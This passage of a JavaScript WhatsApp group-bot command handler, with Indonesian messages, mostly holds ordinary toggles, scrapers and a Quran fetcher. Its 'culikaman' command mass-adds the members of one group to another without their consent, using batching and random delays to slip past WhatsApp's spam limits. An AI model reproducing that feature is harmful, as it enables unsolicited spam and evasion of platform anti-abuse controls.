}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break
case 'ytss': case 'ssyt': {
  if (!text) return conn.sendMessage(m.chat, {
    text: 'Masukkan link YouTube!\n\nContoh:\n*.ytss https://youtube.com/watch?v=B7xai5u_tnk*'
  }, { quoted: m })

  try {
    const ssyoutube = {
      dl: async (u) => {
        const FormData = (await import('form-data')).default
        const cheerio = await import('cheerio')
        const axios = require('axios')
        const d = new FormData()
        d.append('videoURL', u)
        const headers = {
          ...d.getHeaders(),
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36',
          'Referer': 'https://ssyoutube.online/',
          'Origin': 'https://ssyoutube.online'
        }
        const { data } = await axios.post('https://ssyoutube.online/yt-video-detail/', d, { headers })
        const $ = cheerio.load(data)
        const safeText = (selector) => $(selector).text()?.trim() || '-'
        const safeAttr = (selector, attr) => $(selector).attr(attr) || ''
        const videoInfo = {
          title: safeText('.videoTitle'),
          duration: safeText('.duration label').replace('Duration: ', '').trim(),
          views: safeText('.view label'),
          likes: safeText('.like label'),
          comments: safeText('.comment label'),
          thumbnail: safeAttr('.thumbnail', 'src')
        }
        const downloadOptions = []
        $('.format-section tr').each((i, el) => {
          const row = $(el)
          const quality = row.find('td:first-child').text()?.trim()
          const size = row.eq(1).text()?.trim()
          const btn = row.find('button')
          const url = btn.attr('data-url') || ''
          if (quality && url) {
            downloadOptions.push({
              quality: quality.replace(/\s+/g, ' '),
              size,
              url,
              hasAudio: btn.attr('data-has-audio') === 'true',
              type: quality.includes('M4A') ? 'audio' : 'video'
            })
          }
        })
        return { videoInfo, downloadOptions }
      }
    }
    const result = await ssyoutube.dl(text)
    const { videoInfo, downloadOptions } = result

    let caption = `*YouTube Info:*\n`
    caption += `• Judul: ${videoInfo.title}\n`
    caption += `• Durasi: ${videoInfo.duration}\n`
    caption += `• Views: ${videoInfo.views}\n`
    caption += `• Likes: ${videoInfo.likes}\n`
    caption += `• Komentar: ${videoInfo.comments}\n\n`

    if (downloadOptions.length > 0) {
      caption += `*Download Options:*\n`
      downloadOptions.slice(0, 2).forEach((opt, i) => {
        caption += `${i + 1}. ${opt.quality} | ${opt.size} | [${opt.type}]\n${opt.url}\n\n`
      })
    } else {
      caption += `_Tidak ada opsi unduhan ditemukan._`
    }
    await conn.sendMessage(m.chat, {
      image: { url: videoInfo.thumbnail },
      caption
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    await conn.sendMessage(m.chat, {
      text: `Gagal fetch data dari ssyoutube.\n\n*Error:* ${e.message}`
    }, { quoted: m })
  }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'antitagsw':
  if (!isGroup) return m.reply('Fitur ini hanya bisa dipakai di grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!db.data) db.data = {}
  if (!db.data.chats) db.data.chats = {}
  if (!db.data.chats[m.chat]) db.data.chats[m.chat] = {}
  if (!db.data.chats[m.chat].antitagsw) db.data.chats[m.chat].antitagsw = { status: false, count: {} }
  let type = (q || '').toLowerCase()
  if (type === 'on') {
    if (db.data.chats[m.chat].antitagsw.status) return m.reply('Anti tag semua sudah aktif.')
    db.data.chats[m.chat].antitagsw.status = true
    m.reply('Anti tag semua telah *diaktifkan*!')
  } else if (type === 'off') {
    if (!db.data.chats[m.chat].antitagsw.status) return m.reply('Anti tag semua sudah nonaktif.')
    db.data.chats[m.chat].antitagsw.status = false
    db.data.chats[m.chat].antitagsw.count = {} 
    m.reply('Anti tag semua telah *dinonaktifkan*!')
  } else {
    m.reply(`Penggunaan:\n${prefix}antitagsw on\n${prefix}antitagsw off`)
  }
  break

case 'antihidetag': {
  db.data.chats ??= {}
  db.data.chats[m.chat] ??= {}
  if (!m.isGroup) return m.reply('Fitur ini hanya untuk grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  let type = (argsbiyuoffc[0] || '').toLowerCase()
  if (type === 'on') {
    db.data.chats[m.chat].antihidetag = true
    m.reply('Fitur Anti Hidetag AKTIF.')
  } else if (type === 'off') {
    db.data.chats[m.chat].antihidetag = false
    m.reply('Fitur Anti Hidetag NONAKTIF.')
  } else {
    m.reply(`Penggunaan:\n${prefix + command} on / off`)
  }
}
break

case 'autohidetag': {
  db.data ??= {}
  db.data.chats ??= {}
  db.data.chats[m.chat] ??= {}
  if (!m.isGroup) return m.reply('Khusus di grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  let chat = db.data.chats[m.chat]
  if (!chat) db.data.chats[m.chat] = {}
  const arg = (argsbiyuoffc[0] || '').toLowerCase()
  if (arg === 'on') {
    if (chat.autohidetag) return m.reply('Auto Hidetag sudah aktif.')
    chat.autohidetag = true
    m.reply('Auto Hidetag *diaktifkan*!')
  } else if (arg === 'off') {
    if (!chat.autohidetag) return m.reply('Auto Hidetag sudah nonaktif.')
    chat.autohidetag = false
    m.reply('Auto Hidetag *dinonaktifkan*!')
  } else {
    m.reply(`Contoh penggunaan:\n${prefix + command} on / off`)
  }
}
break

case 'autoreactionsw':
if (!isCreator) return Reply(mess.owner)
   if (!text) return m.reply(`*Contoh:* autoreactionsw on / off`)
   if (text.toLowerCase() === 'on') {
      conn.autoReactionSW = true
      m.reply(`Fitur auto reaction di status WhatsApp *aktif*`)
   } else if (text.toLowerCase() === 'off') {
      conn.autoReactionSW = false
      m.reply(`Fitur auto reaction di status WhatsApp *nonaktif*`)
   } else {
      m.reply(`Pilihan hanya *on* atau *off*`)
   }
   break

case 'addbl':
  if (!m.isGroup) return m.reply('Fitur ini hanya untuk grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  let word = argsbiyuoffc.join(' ').toLowerCase()
  if (!word) return m.reply('Masukkan kata yang ingin diblacklist!')
  if (!db.data.blacklist) db.data.blacklist = []
  db.data.blacklist.push(word)
  m.reply(`Kata '${word}' berhasil ditambahkan ke blacklist!`)
  break   
  
case 'leaderboard':
  let leaderboard = Object.entries(chatCount)
    .sort((a, b) => b[1] - a[1])
    .map(([user, count], index) => `${index + 1}. @${user.split('@')[0]} - ${count} chat`)
  m.reply(leaderboard.join('\n'))
  break

case 'culikaman': {
  if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
  if (!text) return m.reply('Format Salah!\nContoh: .culikaman idGrupAsal|idGrupTujuan');
  let [fromGroup, toGroup] = text.split('|').map(v => v.trim());
  if (!fromGroup || !toGroup) return m.reply('Format Salah!\nContoh: .culikaman idGrupAsal|idGrupTujuan');

  try {
    let metadata = await conn.groupMetadata(fromGroup);
    let targetGroup = await conn.groupMetadata(toGroup);
    if (!targetGroup.participants.find(p => p.id == conn.user.jid || p.id == conn.decodeJid(conn.user.id)))
      return m.reply('❌ Bot Harus Jadi Admin Di Grup Tujuan!');
    let peserta = metadata.participants.map(v => v.id);
    let sudah = targetGroup.participants.map(u => u.id);
    let belum = peserta.filter(x => !sudah.includes(x));
    let total = belum.length;
    let batchSize = 15;
    let jedaBatch = 1000 * 60 * 10; // 10 menit
    m.reply(`🚀 Mulai Culik Aman\n📊 Total Target: ${total} orang\n📦 Limit per batch: ${batchSize} orang\n⏳ Jeda antar batch: 10 menit`);
    for (let i = 0; i < belum.length; i += batchSize) {
      let batch = belum.slice(i, i + batchSize);
      for (let user of batch) {
        try {
          await delay(Math.floor(Math.random() * 3000) + 3000); 
          await conn.groupParticipantsUpdate(toGroup, [user], 'add');
        } catch (e) {
          console.log(`❌ Gagal add ${user} → ${e.message}`);
        }
      }
      if (i + batchSize < belum.length) {
        await conn.sendMessage(m.chat, { text: `✅ Batch ${i / batchSize + 1} selesai.\n⏱️ Lanjut 10 menit lagi...` });
        await delay(jedaBatch);
      }
    }
    m.reply('✅ Semua target sudah diproses!');
  } catch (e) {
    console.log(e);
    m.reply('❌ Gagal proses.\nPastikan ID grup benar dan bot adalah admin di grup tujuan.');
  }
}
break
  
case 'antitoxic':
  if (!m.isGroup) return m.reply('Fitur ini hanya untuk grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (argsbiyuoffc[0] === 'on') {
    antitoxic[m.chat] = { active: true, warnings: {} }
    saveAntiToxic()
    m.reply('✅ AntiToxic AKTIF di grup ini.')
  } else if (argsbiyuoffc[0] === 'off') {
    delete antitoxic[m.chat]
    saveAntiToxic()
    m.reply('❌ AntiToxic NONAKTIF.')
  } else {
    m.reply('Gunakan: .antitoxic on / .antitoxic off')
  }
  break
  
case 'setconfig':
case 'upconfig': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <v1/v2/v3/v4/v5> <domain/apikey/capikey> <value>`);
    const args = text.split(' ');
    if (argsbiyuoffc.length < 3) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <v1/v2/v3/v4/v5> <domain/apikey/capikey> <value>`);
    const serverVersion = argsbiyuoffc[0].toLowerCase(); 
    const configType = argsbiyuoffc[1].toLowerCase(); 
    const newValue = argsbiyuoffc.slice(2).join(' ') || m.quoted.text;
    if (!newValue) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <${serverVersion}> <${configType}> <value>`);
    let configKey, regex;
    switch (serverVersion) {
        case 'v1':
            if (configType === 'domain') { configKey = 'domain'; regex = /(global\.domain\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'apikey') { configKey = 'apikey'; regex = /(global\.apikey\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'capikey') { configKey = 'capikey'; regex = /(global\.capikey\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            break;
        case 'v2':
            if (configType === 'domain') { configKey = 'domainV2'; regex = /(global\.domainV2\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'apikey') { configKey = 'apikeyV2'; regex = /(global\.apikeyV2\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'capikey') { configKey = 'capikeyV2'; regex = /(global\.capikeyV2\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            break;
        case 'v3':
            if (configType === 'domain') { configKey = 'domainV3'; regex = /(global\.domainV3\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'apikey') { configKey = 'apikeyV3'; regex = /(global\.apikeyV3\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'capikey') { configKey = 'capikeyV3'; regex = /(global\.capikeyV3\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            break;
        case 'v4':
            if (configType === 'domain') { configKey = 'domainV4'; regex = /(global\.domainV4\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'apikey') { configKey = 'apikeyV4'; regex = /(global\.apikeyV4\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'capikey') { configKey = 'capikeyV4'; regex = /(global\.capikeyV4\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            break;
        case 'v5':
            if (configType === 'domain') { configKey = 'domainV5'; regex = /(global\.domainV5\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'apikey') { configKey = 'apikeyV5'; regex = /(global\.apikeyV5\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            else if (configType === 'capikey') { configKey = 'capikeyV5'; regex = /(global\.capikeyV5\s*=\s*['"`])([^'"`]*?)(['"`])/; }
            break;
        default:
            return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <v1/v2/v3/v4/v5> <domain/apikey/capikey> <value>`);
    }
    global[configKey] = newValue;
    updateConfig(configKey, newValue, regex);
    async function updateConfig(key, value, regex) {
        try {
            const fs = require('fs');
            const path = './settings.js';
            let content = fs.readFileSync(path, 'utf8');
            content = content.replace(regex, `$1${value}$3`);
            fs.writeFileSync(path, content);
            await conn.sendMessage(m.chat, { text: `_Berhasil Mengganti ${key} Panel✅_` }, { quoted: m });
        } catch (error) {
            console.error(`Error updating ${key} in settings.js:`, error);
            await conn.sendMessage(m.chat, { text: `_Gagal menyimpan perubahan ke file settings.js_` }, { quoted: m });
        }
    }
}
break

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'ambilsw': case "sw": {
    if (m.isGroup) return m.reply("❌ Command ini hanya bisa digunakan di chat pribadi!");

    const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMessage) return m.reply("📌 Balas pesan gambar/video yang ingin diambil!");

    if (quotedMessage.imageMessage) {
        let imageUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        return conn.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
    }

    if (quotedMessage.videoMessage) {
        let videoUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        return conn.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });
    }

    return m.reply("❌ Hanya bisa mengambil gambar atau video dari pesan yang dikutip!");
}
break

case 'toanime':
case 'jadianime': {
    
    if (!quoted) return m.reply('Harap balas ke foto yang ingin dikonversi ke anime')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            const axios = require('axios');
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
      
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

       
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://api.botwa.connxdzz.me/api/maker/convertanime?url=${uploadResult.url}&apikey=freekey`
        
        
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: mess.done 
        }, { 
            quoted: m 
        })

      
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in toanime:', error)
        m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break

case 'selectsurah': case "carisurah": case "searchsurah": {
    if (!argsbiyuoffc[0]) return m.reply(`🚫 Masukkan nomor surah yang valid (1-114)\n\n*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`);
    
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    const cache = new Map();
    const CACHE_DURATION = 3600000; 

    async function selectSurah(link) {
        try {
        const axios = require('axios');
            const { data } = await axios.get(link, {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            const cheerio = require('cheerio');
            const $ = cheerio.load(data);
            const Result = [];
            const Isi = [];
            const surah = $('body > main > article > h1').text().trim() || 'Surah tidak ditemukan';
            const bismillah = $('body > main > article > p').text().trim() || '';
            
            $('body > main > article > ol > li').each((i, e) => {
                const arabic = $(e).find('p.arabic').text().trim() || '';
                const baca = $(e).find('p.translate').text().trim() || '';
                const arti = $(e).find('p.meaning').text().trim() || '';
                
                if (arabic || baca || arti) {
                    Isi.push({ arabic, baca, arti });
                }
            });
            
            if (Isi.length === 0) {
                throw new Error('Tidak dapat menemukan ayat-ayat surah');
            }
            
            Result.push({ surah, bismillah }, Isi);
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil surah: ${error.message}`);
        }
    }

    async function listsurah() {
        try {
        const axios = require('axios');
            const { data } = await axios.get('https://litequran.net/', {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            const cheerio = require('cheerio');
            const $ = cheerio.load(data);
            const Result = [];
            
            $('body > main > ol > li').each((i, e) => {
                const element = $(e).find('a');
                if (element.length) {
                    const name_surah = element.text().trim();
                    const href = element.attr('href');
                    if (name_surah && href) {
                        Result.push({
                            link: 'https://litequran.net/' + href,
                            name_surah
                        });
                    }
                }
            });
            
            if (Result.length === 0) {
                throw new Error('Tidak dapat menemukan daftar surah');
            }
            
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil daftar surah: ${error.message}`);
        }
    }

    async function getSurah(surahIndex) {
        try {
            
            const cacheKey = `surah_${surahIndex}`;
            const cachedData = cache.get(cacheKey);
            if (cachedData && (Date.now() - cachedData.timestamp) < CACHE_DURATION) {
                return cachedData.data;
            }

            const surahList = await listsurah();
            
            if (surahIndex < 1 || surahIndex > 114) {
                return "🚫 *Nomor surah tidak valid.* Silakan masukkan nomor 1-114.";
            }

            if (surahIndex > surahList.length) {
                return "🚫 *Surah tidak ditemukan.* Coba periksa kembali nomor surah.";
            }

            await delay(500);

            const selectedSurah = surahList[surahIndex - 1];
            const surahContent = await selectSurah(selectedSurah.link);

            let response = `🕌 *${surahContent[0].surah}*\n\n`;
            if (surahContent[0].bismillah) {
                response += `${surahContent[0].bismillah}\n\n`;
            }
            response += `📜 *Ayat-ayat suci Al-Quran:*\n\n`;

            surahContent[1].forEach((ayah, index) => {
                response += `*𖦹 Ayat ${index + 1}:*\n`;
                if (ayah.arabic) response += `🕋 ${ayah.arabic}\n`;
                if (ayah.baca) response += `📖 ${ayah.baca}\n`;
                if (ayah.arti) response += `📚 ${ayah.arti}\n\n`;
            });

            response += `\n🤲 *Semoga Allah memberikan pemahaman dari ayat-ayat ini.*`;

            
            cache.set(cacheKey, {
                data: response,
                timestamp: Date.now()
            });

            return response;
        } catch (error) {
            return `🚫 *Error:* ${error.message}`;
        }
    }

    try {
        const surahIndex = parseInt(argsbiyuoffc[0]);
        if (isNaN(surahIndex)) {
            return m.reply("🚫 *Masukkan nomor surah yang valid (1-114).*");
        }
        
        m.reply("⏳ *Sedang mengambil surah...*");
        const response = await getSurah(surahIndex);
        m.reply(response);
    } catch (error) {
        m.reply(`🚫 *Terjadi kesalahan:* ${error.message}`);
    }
    }
    break

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "auto": {
    try {
        const fs = require('fs');
        const moment = require('moment-timezone');
        const schedule = require('node-schedule');
        const dbFile = './autoGC.json';
        const timeZone = 'Asia/Jakarta';
        global.autoGC = global.autoGC || {};
        if (fs.existsSync(dbFile)) {
            global.autoGC = JSON.parse(fs.readFileSync(dbFile));
        } else {
            fs.writeFileSync(dbFile, JSON.stringify({}, null, 2));
        }
        const saveDB = () => {
            try {
                fs.writeFileSync(dbFile, JSON.stringify(global.autoGC, null, 2));
                return true;
            } catch (err) {
                console.error('Error saving database:', err);
                return false;
            }
        };
        const checkGroupsStatus = async () => {
            try {
                const currentTime = moment().tz(timeZone).format('HH:mm');
                for (const chatId in global.autoGC) {
                    if (!global.autoGC[chatId]?.enabled) continue;
                    const { closeTime, openTime, originalName, status } = global.autoGC[chatId];
                    if (currentTime === closeTime && status !== 'closed') {
                        try {
                            await conn.groupSettingUpdate(chatId, 'announcement');
                            await conn.groupUpdateSubject(chatId, `${originalName} (❌ DITUTUP)`);
                            await conn.sendMessage(chatId, { text: `🚫 *GRUP DITUTUP SEMENTARA* 🚫\n\nAkan dibuka kembali pada *${openTime}* WIB.` });
                            global.autoGC[chatId].status = 'closed';
                            saveDB();
                        } catch (e) {
                            console.error(`Error closing group ${chatId}:`, e);
                        }
                    }
                    if (currentTime === openTime && status !== 'opened') {
                        try {
                            await conn.groupSettingUpdate(chatId, 'not_announcement');
                            await conn.groupUpdateSubject(chatId, originalName);
                            await conn.sendMessage(chatId, { text: `✅ *GRUP DIBUKA KEMBALI* ✅\n\nWaktu tutup berikutnya: *${closeTime}* WIB.` });
                            global.autoGC[chatId].status = 'opened';
                            saveDB();
                        } catch (e) {
                            console.error(`Error opening group ${chatId}:`, e);
                        }
                    }
                }
            } catch (err) {
                console.error('Error in checkGroupsStatus:', err);
            }
        };
        if (!global.autoGCSchedule) {
            global.autoGCSchedule = schedule.scheduleJob('* * * * *', () => {
                checkGroupsStatus().catch(err => console.error('Error in schedule:', err));
            });
            console.log('Auto GC schedule initialized');
        }
        const chatId = m.chat;
        if (!m.isGroup) return m.reply('❌ Perintah ini hanya dapat digunakan dalam grup!');
        let groupMetadata;
        try {
            groupMetadata = await conn.groupMetadata(chatId);
        } catch (err) {
            console.error('Error getting group metadata:', err);
            return m.reply('❌ Gagal memperoleh informasi grup.');
        }
        const sender = m.sender;
        const isAdmin = groupMetadata.participants.some(participant => 
            participant.id === sender && (participant.admin === 'admin' || participant.admin === 'superadmin'));
        if (!isAdmin) return m.reply('❌ Hanya admin grup yang dapat menggunakan perintah ini.');
        if (argsbiyuoffc[0]?.toLowerCase() === 'on') {
            global.autoGC[chatId] = {
                enabled: true,
                closeTime: global.autoGC[chatId]?.closeTime || '23:00',
                openTime: global.autoGC[chatId]?.openTime || '04:00',
                originalName: groupMetadata.subject,
                status: 'opened'
            };
            return saveDB() 
                ? m.reply(`✅ Auto-close/open telah *DIAKTIFKAN*.\n\n📌 Tutup: ${global.autoGC[chatId].closeTime} WIB\n📌 Buka: ${global.autoGC[chatId].openTime} WIB`)
                : m.reply('❌ Gagal menyimpan pengaturan.');
        }
        if (argsbiyuoffc[0]?.toLowerCase() === 'off') {
            if (!global.autoGC[chatId]?.enabled) return m.reply('⚠️ Auto-close/open sudah nonaktif.');
            delete global.autoGC[chatId];
            return saveDB() ? m.reply('❌ Auto-close/open telah *DINONAKTIFKAN*.') : m.reply('❌ Gagal menyimpan pengaturan.');
        }
        if (argsbiyuoffc[0]?.toLowerCase() === 'set' && argsbiyuoffc[1] && argsbiyuoffc[2]) {
            if (!/^([01]\d|2[0-3]):([0-5]\d)$/.test(argsbiyuoffc[1]) || !/^([01]\d|2[0-3]):([0-5]\d)$/.test(argsbiyuoffc[2])) {
                return m.reply('⚠️ Format waktu salah! Gunakan format HH:MM 24 jam.');
            }
            global.autoGC[chatId] = {
                enabled: true,
                closeTime: argsbiyuoffc[1],
                openTime: argsbiyuoffc[2],
                originalName: groupMetadata.subject,
                status: 'opened'
            };
            return saveDB() 
